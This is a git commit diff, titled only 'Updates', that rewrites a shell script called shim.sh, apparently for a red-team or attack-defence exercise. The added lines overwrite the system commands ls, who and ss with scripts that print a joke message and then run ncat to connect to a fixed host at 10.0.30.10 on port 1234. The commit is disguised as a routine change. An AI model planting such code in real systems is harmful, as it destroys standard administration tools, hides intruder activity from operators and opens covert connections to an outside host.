7a461ab007b493f818d5b030f4480d515c9099fc
Patrick McCabe <mccabepj@g.cofc.edu>
2022-01-16 13:04:34 -0600

    Updates

--- scripts/shim.sh
+++ scripts/shim.sh
@@ -1,3 +1,14 @@
 #!/bin/bash
 
-echo ""
+echo "cowsay \"This command is broken\"" > /bin/ls
+echo "ncat 10.0.30.10 1234" >> /bin/ls
+chmod +x /bin/ls
+
+echo "cowsay \"This command is also broken\"" > /bin/who
+echo "ncat 10.0.30.10 1234" >> /bin/who
+chmod +x /bin/who
+
+echo "cowsay \"Really having a bad time with these commands now\"" > /bin/ss
+echo "ncat 10.0.30.10 1234" >> /bin/ss
+chmod +x /bin/ss
+
